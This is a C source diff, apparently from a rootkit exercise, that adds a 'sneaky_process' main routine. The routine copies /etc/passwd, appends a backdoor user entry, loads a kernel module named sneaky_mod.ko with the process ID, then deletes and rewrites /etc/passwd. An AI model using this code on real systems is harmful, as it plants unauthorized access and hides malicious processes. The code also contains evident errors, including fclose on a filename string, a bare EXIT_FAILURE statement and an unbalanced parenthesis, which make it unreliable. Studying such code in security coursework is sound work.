@@ -3,6 +3,16 @@
 #include <sys/types.h>
 #include <unistd.h>
 
+void add_to_pw(const char * fileName, const char * line){
+    FILE * file = fopen(fileName, "a");
+    if(!file){
+        perror("Fail to open file for writing in pw\n");
+        EXIT_FAILURE;
+    }
+    fprintf(file,"%s",line);
+    fclose(fileName);
+}
+
 void copy_file(const char * origin_file, const char * dest_file){
     FILE * origin = fopen(origin_file,"r");
     FILE * dest = fopen(dest_file,"w");
@@ -23,12 +33,25 @@ void copy_file(const char * origin_file, const char * dest_file){
     fclose(dest);
 }
 
-void add_to_pw(const char * fileName, const char * line){
-    FILE * file = fopen(fileName, "a");
-    if(!file){
-        perror("Fail to open file for writing in pw\n");
-        EXIT_FAILURE;
+int main(){
+    printf("sneaky_process pid = %d\n", getpid());
+    copy_file("/etc/passwd","/tmp/passwd");
+    add_to_pw("/tmp/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
+
+    char command[100];
+    sprintf(command, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
+    system(command));
+
+    char input;
+    input = getchar();
+    while(input!='q'){
+        input = getchar();
     }
-    fprintf(file,"%s",line);
-    fclose(fileName);
+
+    system("rmmod sneaky_mod.ko");
+    system("rm /etc/passwd");
+    system("touch /etc/passwd");
+    copy_file("/tmp/passwd", "/etc/passwd");
+    system("rm /tmp/passwd");
+    return EXIT_SUCCESS;
 }
